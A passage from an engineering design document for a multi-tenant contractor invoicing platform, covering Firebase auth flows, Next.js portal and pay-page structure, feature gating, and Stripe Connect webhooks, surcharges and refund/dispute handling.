`consumeNumber()` operates on `tenants/{tenantId}/counters/invoiceCounter` — still race-safe via Firestore transactions, just path-scoped.

### Stripe webhook
- Webhook receives events with `account` field (Connect)
- Use `event.account` to read `stripeAccounts/{event.account}` → `{ tenantId }` (single doc read, no index, no `collectionGroup` scan). **Do NOT use `db.collectionGroup('meta').where('stripeAccountId', '==', event.account)`** — that path would require a composite collection-group index AND be slower and more fragile than the reverse lookup.
- Route payment updates to `tenants/{tenantId}/invoices/{invoiceId}`
- Include `tenantId` and `invoiceId` in Stripe checkout session metadata at creation time as a double-check

### Recurring invoice processor
- Scheduled function iterates `collectionGroup('recurringInvoices')`
- Extract `tenantId` from each doc's parent path
- Check tenant's `entitlements.features.recurringInvoices` — skip if disabled
- Generate new invoice under the correct tenant's path

### Customer magic link flow (end-to-end specification)

**Trigger:** The contractor sends an invoice via `sendInvoiceEmail`. The email body contains a "View & Pay Invoice" button with a URL like:
```
https://invoices.smithplumbing.ca/portal/invoices/{id}?tenantId={tenantId}
```
(Or `portal.techflowsolutions.ca/portal/invoices/{id}?tenantId={tenantId}` for tenants without a custom domain.)

**Route mapping:** `/portal/invoices/[id]` is the canonical single-invoice route in the repo structure (Phase 3). Earlier drafts of this document referenced `/portal/invoices/[id]?invoiceId=...` as shorthand — that's **not a separate route**, it's the same page. The email link uses the canonical App Router path directly. `tenantId` is passed as a query param so the middleware/page can resolve branding before the invoice doc is read (the invoice is under `tenants/{tenantId}/invoices/{id}` and the ID alone isn't enough to locate it).

**Flow:**
1. Customer clicks the link in their email.
2. The `/portal/invoices/[id]` page checks if the user is already authenticated with a verified email matching the invoice's `customer.email`. If yes, show the invoice immediately.
3. If not authenticated, the page shows a branded login screen (tenant branding resolved from the domain or `tenantId` param) with one option: "Sign in with email." Customer enters their email.
4. **⚠️ BEFORE calling sendSignInLinkToEmail:** store the customer's email in `localStorage` (e.g. `localStorage.setItem('emailForSignIn', email)`). This is **mandatory** — Firebase's `signInWithEmailLink()` requires the email as a parameter on return, and if the customer opens the magic link on a different browser/device or their tab state is lost, the email won't be available from memory. Without this step, the first login attempt fails silently.
5. App calls `sendSignInLinkToEmail(email, { url: <the original /portal/invoices/[id] URL>, handleCodeInApp: true })`. Firebase sends a magic link to the customer's inbox.
6. Customer clicks the magic link in the second email. The return page detects it's a sign-in link via `isSignInWithEmailLink(auth, window.location.href)`, retrieves the email from `localStorage.getItem('emailForSignIn')`, and calls `signInWithEmailLink(auth, email, window.location.href)`. If `localStorage` is empty (different device/browser), prompt the customer to re-enter their email before completing sign-in. On success, clear the stored email from `localStorage`.
7. Firebase Auth completes sign-in, sets `email_verified: true`. The page redirects to the original `/portal/invoices/[id]?invoiceId=...` URL (carried in the `actionCodeSettings.url`).
8. The page now has an authenticated user with a verified email. It calls `getCustomerInvoiceDetail` (or reads Firestore directly if rules permit) and renders the invoice with the embedded `tenantSnapshot` branding.
9. Customer can pay (triggers `payInvoice` → Stripe checkout on tenant's Connect account) or download PDF.

**Key implementation details:**
- `sendInvoiceEmail` Cloud Function must construct the portal URL with the correct domain (custom if set, generic if not) and include `tenantId` + `invoiceId` as query params.
- The `actionCodeSettings.url` passed to `sendSignInLinkToEmail` must point back to the exact invoice view URL so the customer lands on the right page after auth.
- Firebase Auth authorized domains must include the tenant's custom domain (if any) for the magic link redirect to work. See Phase 5 custom domain automation.
- First-time customers are auto-created in Firebase Auth by the magic link flow — no pre-registration needed.
- Returning customers who are already signed in skip steps 3–5 entirely.

### Bundle 3 carry-over
All the Cloud Functions auth-check security fixes from the original Phase 3 Bundle 2 audit (missing `request.auth` checks on `previewInvoicePDF`, `previewQuotePDF`, `sendQuoteEmail`, `sendInvoiceEmail`, `createCheckoutSession`) are subsumed into this rewrite. Every function in the new codebase will enforce auth + tenantId + feature gates from the first commit.

**Estimated effort:** 4–6 days

---

## Phase 3 — Frontend Architecture (Next.js + Tailwind)

### Repo structure

```
src/
  app/
    (auth)/
      login/page.tsx           ← tenant user login (email + password)
      signup/page.tsx          ← tenant user signup (new tenant + owner)
      forgot-password/page.tsx ← calls sendPasswordResetEmail(); confirmation screen
      auth/action/page.tsx     ← Firebase action-code handler (?mode=resetPassword |
                                  verifyEmail | recoverEmail); dispatches by mode,
                                  renders branded reset/verify UI so links don't send
                                  users to the default Firebase-hosted page
    (dashboard)/               ← tenant admin area, requires tenantId claim
      layout.tsx               ← wraps with TenantProvider
      dashboard/page.tsx
      invoices/
        page.tsx
        new/page.tsx
        [id]/page.tsx
      quotes/                  ← gated by 'quotes' feature
        [id]/page.tsx          ← has "Convert to Invoice" action
      customers/page.tsx
      settings/
        page.tsx               ← business info + branding
        team/page.tsx          ← staff invitations (list + invite form + revoke)
      billing/page.tsx         ← Stripe Connect onboarding
      accept-invite/page.tsx   ← staff invite acceptance landing (verifies token, sets claims)
    (portal)/                  ← customer portal, requires email_verified, NO tenantId
      layout.tsx               ← wraps with CustomerPortalProvider + generateMetadata(tenant)
      portal/
        login/page.tsx         ← magic link sign-in (branded, SSR tenant fetch)
        page.tsx               ← list of customer's invoices across all tenants
        invoices/[id]/page.tsx ← single invoice view + pay button + PDF download
        quotes/[id]/page.tsx   ← single quote view + PDF download
    (pay)/                     ← public no-auth pay pages, resolved by JWT pay token
      pay/
        [token]/page.tsx       ← public hosted pay page — SSR verifies token, shows branded
                                 invoice summary + payment method list (e-transfer first,
                                 then credit card with optional surcharge disclosure).
                                 No Firebase auth — the signed JWT is the auth.
        [token]/success/page.tsx ← Stripe redirect target after successful checkout
        [token]/cancelled/page.tsx ← Stripe redirect target if customer cancels
    api/
      pdf/
        invoice/route.ts       ← Next.js proxy → Cloud Run pdf-service (auth: tenant OR customer)
        quote/route.ts
      webhooks/
        stripe/route.ts
  lib/
    firebase/
      client.ts                ← client SDK init
      admin.ts                 ← admin SDK (server only)
    tenant/
      TenantContext.tsx        ← for tenant admin area
      useTenant.ts
      FeatureGate.tsx
    portal/
      CustomerPortalContext.tsx  ← for customer portal area
      useCustomerPortal.ts
    features.ts                ← canonical feature constant
    auth/
      useAuth.ts               ← unified auth hook; routes based on claims after login
  components/
    ui/                        ← shared primitives (button, input, card)
    invoices/                  ← shared between dashboard and portal
    customers/                 ← dashboard only
    quotes/                    ← shared between dashboard and portal
    portal/                    ← portal-specific (InvoicePayButton, PortalHeader, etc.)
```

### Auth recovery flow (password reset + email verification)

Tenant users need a path back in when they forget their password, and owners creating Connect accounts should have verified emails. Both run on the same Firebase action-code infrastructure:

- **`/forgot-password`** — single input + "send reset link" button. Calls `sendPasswordResetEmail(auth, email, { url })` where `url` is the `/auth/action` page on our own domain. Always shows a generic success message (don't leak whether the email is registered — standard anti-enumeration).
- **`/auth/action`** — one page, dispatches by `?mode=` query param: `resetPassword` (renders "new password" form + calls `confirmPasswordReset`), `verifyEmail` (calls `applyActionCode`, then redirects to `/dashboard`), `recoverEmail` (rare, handled defensively). Must `checkActionCode` before rendering — expired/used codes get a clear error instead of a mysterious failure.
- **Email verification gate** — add `if (!user.emailVerified) redirect('/verify-email')` to the `(dashboard)` layout. `/verify-email` shows a "resend verification email" button and a "check your inbox" message. Block invoice creation until verified to satisfy Stripe Connect's business-contact-email expectations.
- **Firebase project configuration** (one-time per project — dev, staging, prod):
  - Email templates: set the **"Password reset"** and **"Email verification"** action URLs to `https://<portal-domain>/auth/action` (not the default Firebase-hosted URL). Custom templates branded with the TechFlow name.
  - Authorized domains: include `<portal-domain>` and every tenant custom domain so the action links redirect correctly. Custom domains are added automatically by the `setupCustomDomain` Cloud Function (Phase 5).
- **2FA deferred to post-launch.** Noted as a gap — owner accounts with Stripe Connect access arguably warrant it. Acceptable for MVP; flag in /settings/security as "coming soon" so it's visible.

### Post-login routing

The login flow checks the user's token claims and routes accordingly:

```typescript
// after successful sign-in
const claims = (await user.getIdTokenResult()).claims;
if (claims.tenantId) {
  router.push('/dashboard');       // tenant user
} else if (claims.email_verified) {
  router.push('/portal');          // customer
} else {
  router.push('/verify-email');    // shouldn't happen with magic link, defensive
}
```

### ⚠️ Firebase Auth custom claims propagation delay

**This is a known Firebase gotcha that will break the signup flow if not handled.**

When `onSignup` fires and calls `setCustomUserClaims(uid, { tenantId, role })`, the user's **current ID token in the browser still has NO `tenantId` claim.** Firebase custom claims only propagate to the client on the next token refresh, which normally happens every ~60 minutes. If the signup page redirects to `/dashboard` immediately, `TenantProvider` reads the token, finds no `tenantId`, and the user gets bounced to login or sees an error.

**Required fix — force token refresh after signup:**
```typescript
// In the signup page, AFTER calling the onSignup Cloud Function:
await user.getIdToken(true);  // force refresh — pulls fresh claims from server
const claims = (await user.getIdTokenResult()).claims;
// NOW claims.tenantId is present — safe to redirect
router.push('/dashboard');
```

This applies to:
- **Signup flow** (Phase 5): user signs up → `onSignup` sets claims → must force refresh before redirect.
- **Role changes** (Phase 5): owner changes another user's role via `setUserRole` → that user's token is stale until they refresh. Consider showing a "your permissions were updated, please refresh" toast, or triggering a refresh via a Firestore listener on the user's doc.
- **NOT customer magic link flow**: customers have no custom claims (no `tenantId`). Their auth relies on `email_verified` which is set natively by Firebase Auth during magic link sign-in, not via custom claims.

### `CustomerPortalContext` — the customer-side provider

Mirrors `TenantContext` but scoped to what a customer can see. Loads `getCustomerInvoices()` result once, exposes:
- `customerEmail` (from auth token)
- `invoices` (array, deduplicated across tenants)
- `quotes` (array)
- `getInvoice(id)` / `getQuote(id)` accessors
- `getTenantSnapshot(invoiceOrQuote)` helper — reads the embedded `tenantSnapshot` so the portal UI can render the right logo/colors for each document

**Critical:** the portal UI renders branding PER DOCUMENT from the `tenantSnapshot`, not from a global context. A customer with invoices from three different contractors sees three different logos in their list. Each invoice's detail page takes on the branding of the contractor who sent it.

### `lib/features.ts` — canonical feature list

```typescript
export const DEFAULT_FEATURES = {
  invoices:          true,   // core
  customers:         true,   // core
  quotes:            false,
  recurringInvoices: false,
  stripePayments:    false,
  customDomain:      false,  // gated — only tenants on plans that include custom domains
  bookingSystem:     false,
  // add new keys here
} as const;

export type FeatureKey = keyof typeof DEFAULT_FEATURES;

export function resolveFeatures(
  entitlements?: { features?: Partial<typeof DEFAULT_FEATURES> }
) {
  return { ...DEFAULT_FEATURES, ...(entitlements?.features ?? {}) };
}
```

**Critical property:** when a new feature key is added to this constant, every existing tenant immediately gets the default value (usually `false`) at read time. No Firestore backfill ever needed.

### `lib/tenant/TenantContext.tsx`

```typescript
interface TenantContextValue {
  tenantId: string;
  meta: TenantMeta;
  plan: 'free' | 'starter' | 'pro';
  features: typeof DEFAULT_FEATURES;
  hasFeature: (key: FeatureKey) => boolean;
}

export function TenantProvider({ children }) {
  const { user } = useAuth();
  const tenantId = user?.claims.tenantId;

  const meta = useFirestoreDoc(`tenants/${tenantId}/meta`);
  const entitlements = useFirestoreDoc(`tenants/${tenantId}/entitlements`);
  const features = useMemo(() => resolveFeatures(entitlements), [entitlements]);

  return (
    <TenantContext.Provider value={{
      tenantId,
      meta,
      plan: entitlements?.plan ?? 'free',
      features,
      hasFeature: (key) => features[key] === true,
    }}>
      {children}
    </TenantContext.Provider>
  );
}
```

### Three feature-gating primitives

**1. Hook — for conditional logic inside a component:**
```tsx
const { hasFeature } = useTenant();
if (hasFeature('quotes')) { /* show quote actions */ }
```

**2. `<FeatureGate>` component — for JSX blocks:**
```tsx
<FeatureGate feature="recurringInvoices">
  <RecurringToggle />
</FeatureGate>

<FeatureGate feature="quotes" fallback={<UpgradePrompt feature="quotes" />}>
  <QuotesPage />
</FeatureGate>
```

**3. Route guard — for whole pages:**
```tsx
// app/quotes/page.tsx
export default function QuotesPage() {
  const { hasFeature } = useTenant();
  if (!hasFeature('quotes')) redirect('/dashboard');
  return <QuotesList />;
}
```

### Navigation gating

Sidebar iterates a nav config and filters by `hasFeature()`:
```tsx
const NAV = [
  { href: '/dashboard', label: 'Dashboard' },
  { href: '/invoices', label: 'Invoices', feature: 'invoices' },
  { href: '/quotes', label: 'Quotes', feature: 'quotes' },
  { href: '/customers', label: 'Customers', feature: 'customers' },
];

{NAV.filter(item => !item.feature || hasFeature(item.feature))
    .map(item => <NavLink key={item.href} {...item} />)}
```

### Tenant-scoped query wrapper
Every Firestore read goes through a helper that injects the tenant path. Because it calls `useTenant()` internally, it IS a React hook and MUST be named with the `use` prefix to satisfy the `react-hooks/rules-of-hooks` ESLint rule:
```typescript
function useTenantCollection<T>(collectionName: string) {
  const { tenantId } = useTenant();
  return collection(db, 'tenants', tenantId, collectionName) as CollectionReference<T>;
}
```

### Observability — Sentry (set up at scaffolding time, not "later")

When 50 tenants run on the same codebase, "the PDF is broken" from one tenant with zero repro steps is a nightmare to debug without error tracking. Sentry solves this cheaply.

**What to capture:**
- All uncaught exceptions in Next.js client + server + API routes
- All uncaught exceptions in Cloud Functions (separate Sentry config for the functions package)
- Every exception tagged with `tenantId` (from auth token or request context) and `uid`. Without this tag, errors are useless noise at 50-tenant scale.

**Setup (~30 min):**
1. `npm install @sentry/nextjs` in the Next.js app
2. Run `npx @sentry/wizard@latest -i nextjs` — generates `sentry.client.config.ts`, `sentry.server.config.ts`, `sentry.edge.config.ts`
3. In a root layout or middleware, set the scope tag from the auth token:
   ```typescript
   Sentry.setUser({ id: uid });
   Sentry.setTag('tenantId', claims.tenantId ?? 'none');
   ```
4. For Cloud Functions: `npm install @sentry/node` in `functions/`, init in the function entry point, wrap handlers with `Sentry.withScope` to tag tenantId per request.
5. Separate Sentry projects per environment (`techflow-dev`, `techflow-staging`, `techflow-prod`) so dev noise doesn't pollute prod alerts.

**Cost:** Sentry free tier (5k events/month) is enough for MVP. Paid tier ($26/month) when usage outgrows free.

**Estimated effort:** 3–5 days (plus the ongoing cost of writing every feature against this architecture)

### Portal & pay-page metadata injection (favicon + `<title>`)

When a customer lands on `pay.acmeplumbing.com/pay/{token}` or `pay.acmeplumbing.com/portal/invoices/{id}`, the browser tab must show Acme's favicon and "Acme Plumbing" as the title — not "TechFlow." Without this, the bundled-website + portal premium-branded pitch falls apart at the browser-tab level (which is where customers park the tab while they get their credit card).

**Implementation — `(portal)/layout.tsx` and `(pay)/pay/[token]/layout.tsx`:**

```typescript
import type { Metadata } from 'next';
import { adminDb } from '@/lib/firebase/admin';

export async function generateMetadata({ params }): Promise<Metadata> {
  // Portal path: resolve tenantId from middleware-injected header (custom domain
  //   or ?tenantId query param for platform-domain fallback).
  // Pay path: decode JWT (without signature verify — we only need tenantId for
  //   metadata; the verify happens in the page SSR render).
  const tenantId = await resolveTenantIdFromRequest(params);
  if (!tenantId) {
    return { title: 'TechFlow', icons: { icon: '/favicon.ico' } };
  }

  const meta = (await adminDb.doc(`tenants/${tenantId}/meta`).get()).data();
  return {
    title: meta?.name ?? 'Invoice',
    icons: {
      icon: meta?.faviconUrl ?? '/favicon.ico',
    },
    // Open Graph for if the pay link gets shared in SMS / Slack / iMessage
    openGraph: {
      title: `Invoice from ${meta?.name ?? 'TechFlow'}`,
      images: meta?.logoUrl ? [meta.logoUrl] : [],
    },
  };
}
```

Notes:
- **Admin SDK is required** because Firestore rules block unauthenticated reads of `meta`. Same pattern as the branded login page (already documented below).
- **The pay page is Node runtime**, not Edge. Admin SDK requires Node. Explicitly set `export const runtime = 'nodejs';` in the layout to prevent Vercel auto-optimizing it to Edge and breaking.
- **Favicon URL is served from Firebase Storage** via `getDownloadURL()` (the token-bearing public URL, per the logo convention). No Storage rules lookup needed; it's publicly fetchable by the browser on the tab.

### Public pay page (`/pay/[token]`) — content specification

The pay page is a **server component** that calls `verifyInvoicePayToken` (Phase 2 callable) on render, then hydrates the payment method selector on the client. It is the single most important customer-facing surface in the platform.

**C3 — Privacy headers on the pay route (mandatory).** The route segment `app/(pay)/pay/[token]/layout.tsx` must export headers that prevent token leakage and search-engine indexing:

```typescript
// app/(pay)/pay/[token]/layout.tsx
export const runtime = 'nodejs';

export async function generateMetadata(...) { /* ...tenant favicon/title... */ }

// Set response headers for the entire /pay/[token]/** subtree.
// Prevents: (a) Referer leak of the token to external links clicked from the page,
// (b) Google/Bing indexing the page if a customer shares the URL publicly,
// (c) iframe embedding attempting to phish via overlay.
export const headers = {
  'Referrer-Policy': 'no-referrer',
  'X-Robots-Tag': 'noindex, nofollow',
  'X-Frame-Options': 'DENY',
};
```

Rationale: the pay-token is bearer-auth in the URL path. Standard URLs leak via `Referer` headers on outbound links, browser history, email-client link-unfurlers (Outlook Safe Links, Gmail, Slack), and server logs. `no-referrer` plugs the biggest hole (outbound clicks from the page). `noindex` prevents accidental indexing if the token-bearing URL is ever shared in a public channel. `X-Frame-Options: DENY` prevents a phishing site from iframing the real pay page under a fake overlay. Token + `status !== 'paid'` + 60d expiry still provide defense in depth; these headers are the cheap, must-have mitigation.

**Render order (top to bottom):**

1. **Branded header** — tenant logo (from `tenantSnapshot.logoUrl`), tenant name. Background uses `tenantSnapshot.primaryColor` with `computeForeground()` for the text. Height ~80px.

2. **Invoice summary card** — invoice number, issue date, due date, total in large type. Line items collapsed by default with an "Itemized view" toggle that expands the full table. Customer name shown as "Billed to: {name}".

3. **Payment method selector** — **e-Transfer listed first**, then credit card:

   ```
   ┌──────────────────────────────────────────┐
   │  ● Interac e-Transfer       No fees      │  ← selected by default
   │    Send to: invoices@acmeplumbing.com    │
   │    Memo: INV-0042                        │
   │    [Copy details]                        │
   │    ⓘ $3,000 per-transaction limit applies│
   │      at most Canadian banks              │
   └──────────────────────────────────────────┘

   ┌──────────────────────────────────────────┐
   │  ○ Credit Card                           │
   │    Visa, Mastercard, Amex accepted       │
   │    + 2.4% processing fee (if enabled)    │
   │    [Pay with Card →]                     │
   └──────────────────────────────────────────┘
   ```

   - **E-transfer** is instructions only (no Stripe involvement). Shows tenant's `etransferEmail`, the invoice number as suggested memo, and a copy-to-clipboard button. Includes the $3k bank-limit tooltip for customer awareness.
   - **Credit card** CTA calls `createPayTokenCheckoutSession` (Phase 2) which creates a Stripe Checkout session on the tenant's Connect account. If `chargeCustomerCardFees === true`, the surcharge line item is added server-side (Phase 4). The disclosure "+ X% processing fee" is rendered next to the button — required by Visa/Mastercard rules and also just good UX.
   - **If the tenant has no `etransferEmail` configured**, the e-transfer option is hidden and credit card becomes the only option. `createInvoice` surfaces a gentle warning in the dashboard when a tenant sends invoices without e-transfer configured ("Most customers prefer e-Transfer — add your e-Transfer email in Settings to offer it").
   - **If the tenant has no connected Stripe account**, the credit card option is hidden and e-transfer is the only option. `createInvoice` should block send entirely if neither is configured.

4. **Footer** — tenant name, address, `emailFooter` text, "Questions? Reply to the email that brought you here." No platform branding ("powered by TechFlow" etc.) — this is the tenant's surface, not the platform's.

5. **Success / cancel redirect targets:**
   - `/pay/[token]/success` — "Payment received. Thanks!" + link to customer portal to see history. Webhook has already updated the invoice by the time the customer lands here (webhook fires before the redirect completes in most cases, but the page gracefully handles the "not yet paid" flicker by polling `verifyInvoicePayToken` once).
   - `/pay/[token]/cancelled` — "No charge was made. You can try again or use e-Transfer instead." + back button to the pay page.

**Why this design wins:**
- **4 clicks → 1 click.** Customer clicks "Pay Invoice" in email → lands on this page → clicks "Pay with Card" → done. No magic-link round trip.
- **E-transfer first** matches Canadian contractor-customer expectations. The industry default payment method for residential trades is e-Transfer, not card.
- **No platform branding on tenant surfaces.** The portal and pay page look like they belong to the tenant, not TechFlow. That's the premium-bundled-website pitch delivered.

---

## Phase 4 — Stripe Connect Express

### Flow

1. **Tenant signs up** → lands on `/billing`, sees "Connect your Stripe account" CTA.
2. **Connect onboarding:** `POST /api/stripe/connect/start` creates an `AccountLink` via Stripe API, returns URL. Tenant redirects to Stripe-hosted onboarding.
3. **Return URL:** `/billing/return` — Cloud Function checks account status via `stripe.accounts.retrieve()`, stores `stripeAccountId` on `tenants/{tenantId}/meta` AND writes the reverse lookup doc `stripeAccounts/{stripeAccountId}` with `{ tenantId }` in the same batched write. The webhook relies on this reverse lookup — if it's missing, the first Connect payment event can't be routed. Both writes must be in a single batch so they can't diverge.
4. **Checkout session creation:** Uses `stripeAccount` parameter to charge on the connected account:
   ```typescript
   stripe.checkout.sessions.create({ ... }, { stripeAccount: tenant.stripeAccountId });
   ```
5. **Webhook routing:** Connect webhooks include `account` field. Use it to look up the tenant. Keep a separate platform-level webhook for account updates.
6. **Platform fee:** Optional. Not set initially. Easy to add later via `application_fee_amount`.

### ⚠️ Two separate webhook types required

Stripe Connect requires **two** webhook configurations. Missing either one breaks a critical flow:

**1. Platform webhook** — receives account-level events about your Connect tenants:
- `account.updated` — fires when a connected account's **capabilities or status change** (e.g. `charges_enabled` flips to true after Stripe completes identity verification, or `details_submitted` becomes true, or a requirement becomes due). This is NOT where you first learn about a new connection — `stripeAccountId` is obtained synchronously at the OAuth return step (Phase 4 step 3) when the tenant returns from Stripe-hosted onboarding. Use `account.updated` to keep the tenant's capability state in sync (e.g. surface "Stripe needs more info from you" in the UI when `requirements.currently_due` is non-empty, or mark the account as ready-to-charge when `charges_enabled === true`).
- `account.application.deauthorized` — tenant disconnected their Stripe account. Clear `stripeAccountId` from meta.
- Register this in Stripe Dashboard → Developers → Webhooks → "Add endpoint" at the platform level.

**Note on the `stripePayments` entitlement flag:** This feature flag is controlled by the platform admin (Reggie) via the `entitlements` doc, **not auto-flipped by any webhook event**. `account.updated` tells you whether the tenant *can* accept charges from Stripe's perspective; the `stripePayments` entitlement tells you whether the platform has *granted* them the ability to use payment features in this app. Those are separate concerns. The `/billing` page should reflect both: "your plan doesn't include Stripe payments" (entitlement) vs "your Stripe account isn't ready yet" (account.updated state).

**2. Connect webhook** — receives payment events from ALL connected accounts:
- `checkout.session.completed` — customer paid an invoice. Route by `event.account` → tenant lookup → verify `metadata.payTokenVersion` matches invoice (C2 guard — auto-refund + audit if not) → mark invoice `status: 'paid'`, write `paidAmountCents` + `surchargeAmountCents` + `paymentMethod: 'card'` + `stripeChargeId`.
- `payment_intent.payment_failed` — mark invoice payment as failed; do not change invoice status (customer can retry).
- `charge.refunded` — **R1 fix.** Fires when tenant issues a refund from Stripe Dashboard OR when the webhook itself auto-refunds (C2 version-mismatch). Handler: read `charge.payment_intent` → look up invoice via `stripeChargeId` reverse lookup (store this field at `checkout.session.completed` time). If `amount_refunded === amount` → set invoice `status: 'refunded'`, write `refundedAt`, `refundedAmountCents`. If partial (`amount_refunded < amount`) → set `status: 'partially-refunded'`, write `refundedAmountCents`. Either way, do NOT clear `paidAmountCents`/`surchargeAmountCents` — those record what was originally charged and are needed for accounting reconciliation.
- `charge.dispute.created` — **R1 fix.** Customer filed a chargeback. Handler: set invoice `disputed: true`, `disputedAt`, `disputeReason: event.data.object.reason` (e.g. `'fraudulent'`, `'product_not_received'`). Do NOT change `status` — disputes can be won. Send notification email to tenant owner with link to Stripe Dashboard dispute evidence form: "Customer {name} disputed invoice #{X}. You have {N} days to submit evidence." Include the dispute deadline from `event.data.object.evidence_details.due_by`.
- `charge.dispute.closed` — **R1 fix.** Dispute resolved. Handler: if `status === 'lost'` → set invoice `status: 'refunded'` (chargeback is effectively a forced refund), `disputed: false`, `disputeOutcome: 'lost'`. If `status === 'won'` → set `disputed: false`, `disputeOutcome: 'won'`, invoice stays `paid`. Notify tenant owner of outcome either way.
- Register this in Stripe Dashboard → Developers → Webhooks → "Add endpoint" → select "Listen to events on Connected accounts."

**Invoice schema additions for R1** (add to the Phase 1 invoice doc spec): `stripeChargeId: string | null`, `refundedAt: Timestamp | null`, `refundedAmountCents: number | null`, `disputed: boolean` (default false), `disputedAt: Timestamp | null`, `disputeReason: string | null`, `disputeOutcome: 'won' | 'lost' | null`. Invoice `status` enum gains `'refunded'` and `'partially-refunded'` values.

**Implementation:** Single `/api/webhooks/stripe` route handler that checks `event.account`:
- If `event.account` is present → it's a Connect event (payment on a connected account). Look up tenant by `stripeAccountId`.
- If `event.account` is absent → it's a platform event (account lifecycle). Read `event.data.object.id` to get the account ID.

Both webhook types can share the same endpoint URL, but the Stripe signature verification uses **different webhook secrets** (platform secret vs Connect secret). The handler must try both secrets or use separate endpoints.

### Development tasks
- Stripe Connect Express app setup in Stripe dashboard
- **Two webhook registrations** in Stripe Dashboard: platform-level + Connect-level (can share one endpoint URL but need separate signing secrets)
- Webhook endpoint: `/api/webhooks/stripe` (single endpoint, routes by event type + account field, verifies with correct signing secret)
- Onboarding UI component for `/billing`
- Feature gate: `stripePayments` feature must be enabled to access `/billing`

### Credit card surcharge — line-item application

When a tenant has `chargeCustomerCardFees === true`, the credit card processing fee is added to the Stripe Checkout session as a **separate line item**, not rolled into the invoice total. This preserves the invoice's real amount for accounting and makes the fee visible to the customer (a Visa/Mastercard disclosure requirement).

**Surcharge calculation (server-side, cannot be set by client):**

```typescript
// functions/src/payments/surcharge.ts
const MAX_SURCHARGE_PERCENT = 2.4; // Visa/Mastercard Canadian ceiling — hard cap.

export function computeSurcharge(invoiceTotalCents: number, tenantMeta: TenantMeta): number {
  if (!tenantMeta.chargeCustomerCardFees) return 0;
  const percent = Math.min(tenantMeta.cardFeePercent ?? 0, MAX_SURCHARGE_PERCENT);
  return Math.round(invoiceTotalCents * (percent / 100));
}
```

**Applied in `createPayTokenCheckoutSession`** (the single canonical payment entry point — see C1 decision in the callable inventory):

```typescript
const surchargeCents = computeSurcharge(invoice.totals.totalCents, tenantMeta);
const lineItems = [
  {
    price_data: {
      currency: tenantMeta.currency.toLowerCase(),
      product_data: { name: `Invoice ${invoice.invoiceNumber}` },
      unit_amount: invoice.totals.totalCents,
    },
    quantity: 1,
  },
];
if (surchargeCents > 0) {
  lineItems.push({
    price_data: {
      currency: tenantMeta.currency.toLowerCase(),
      product_data: {
        name: `Credit card processing fee (${tenantMeta.cardFeePercent}%)`,
      },
      unit_amount: surchargeCents,
    },
    quantity: 1,
  });
}

const session = await stripe.checkout.sessions.create({
  mode: 'payment',
  line_items: lineItems,
  // Credit card only — this pay flow is card-only by design. Other methods
  // (bank debit, etc.) would need separate UX and tax/surcharge handling.
  // Debit Visa/Mastercard technically cannot be surcharged per Canadian rules,
  // but Stripe Checkout does not distinguish debit vs credit at the
  // payment_method_types level (both are 'card'). This is the documented MVP
  // limitation in the surcharge section below.
  payment_method_types: ['card'],
  payment_method_options: {
    card: {
      // 3DS only when surcharging — reduces chargeback risk on the higher-value
      // transaction. Non-surcharge payments use Stripe's default 3DS logic.
      request_three_d_secure: surchargeCents > 0 ? 'any' : 'automatic',
    },
  },
  // metadata carries the invoice + surcharge + pay-token version so the
  // webhook can reconcile AND detect regenerate-during-checkout races.
  metadata: {
    invoiceId: invoice.id,
    tenantId: invoice.tenantId,
    surchargeCents: String(surchargeCents),
    basePaidCents: String(invoice.totals.totalCents),
    payTokenVersion: String(invoice.payTokenVersion),  // C2 guard — see webhook reconciliation below
  },
  success_url: `${baseUrl}/pay/${invoice.payToken}/success`,
  cancel_url: `${baseUrl}/pay/${invoice.payToken}/cancelled`,
}, { stripeAccount: tenantMeta.stripeAccountId });
```

**Important constraints:**

- **Cap is hard-enforced server-side at 2.4%**, regardless of what the client or `updatePaymentSettings` tries to set. Any attempt to set `cardFeePercent > 2.4` throws `invalid-argument`.
- **Debit cards cannot legally be surcharged in Canada.** Stripe Checkout does not cleanly distinguish debit vs credit Visa/Mastercard at the payment-method-types level (both show as `card`). Mitigation: accept the risk for MVP and document it — the practical surcharge rate across mixed debit/credit on a contractor's customer base is small. If this becomes a compliance issue, switch to Stripe's Payment Element with explicit credit-only filtering (post-MVP).
- **Quebec exclusion is NOT auto-enforced in MVP.** Detecting a customer's province requires collecting billing address before checkout, which adds friction. Instead, the one-time acknowledgment modal (Phase 5) makes the tenant contractually responsible: "You confirm that you will not surcharge Quebec customers." Tenants with significant Quebec customer bases should leave surcharging off. Post-MVP: optional billing-address prompt pre-checkout that geo-filters.
- **Webhook reconciliation:** `checkout.session.completed` stores the base + surcharge split on the invoice doc (`paidAmountCents`, `surchargeAmountCents`, `paymentMethod: 'card'`). The invoice `totals` block is untouched — surcharge is separate from the invoice amount. This makes accounting exports clean (the invoice was $500, the surcharge was $12, total charged was $512, tenant's Stripe balance shows $512 minus Stripe fees).

- **C2 — pay-token version guard on webhook (prevents regenerate-during-checkout race).** Before marking the invoice paid, the webhook handler re-reads `invoice.payTokenVersion` and compares it against `session.metadata.payTokenVersion`. If they diverge, the tenant regenerated the link after the customer started checkout (e.g., tenant realized the wrong customer got the email and tried to kill the link). Handler then:
  1. Does NOT set `status: 'paid'`.
  2. Issues an immediate full refund via `stripe.refunds.create({ charge: session.payment_intent, ...}, { stripeAccount: tenantAccountId })`.
  3. Writes an audit doc to `tenants/{tenantId}/invoices/{invoiceId}/paymentIncidents` with `{ reason: 'version-mismatch', sessionId, metadataVersion, currentVersion, refundId, createdAt }`.
  4. Sends a notification email to the tenant owner: "A payment was received after you regenerated the pay link for invoice #X and has been automatically refunded. Contact the customer if this was unexpected."

  Why refund instead of accept: the tenant's intent when regenerating was to kill the old link. Accepting a payment made on a "killed" link silently violates that intent. Automatic refund + audit trail makes the behavior honest and debuggable.

### Token-authenticated checkout (no Firebase auth)

`createPayTokenCheckoutSession` accepts a pay token instead of a Firebase auth context. Server-side:

1. Verify the JWT signature with `PAY_TOKEN_SECRET`.
2. Read the invoice doc; verify `payTokenVersion` matches and `status !== 'paid'`.
3. Check a rate-limit counter at `tenants/{tenantId}/invoices/{invoiceId}/payAttempts` — if more than 10 checkout sessions have been created in the last 24h, reject with `resource-exhausted`. Prevents abuse of the public endpoint. **R2 — auto-cleanup:** each `payAttempts` doc carries an `expireAt: Timestamp` field set to `createdAt + 48h`. A Firestore TTL policy on the `payAttempts` subcollection with `expireAt` as the TTL field deletes expired attempts automatically (configured once per project in Firebase Console → Firestore → TTL policies). No scheduled cleanup function needed. Prevents storage bloat at scale (without this, every invoice accumulates 10 attempt docs forever).
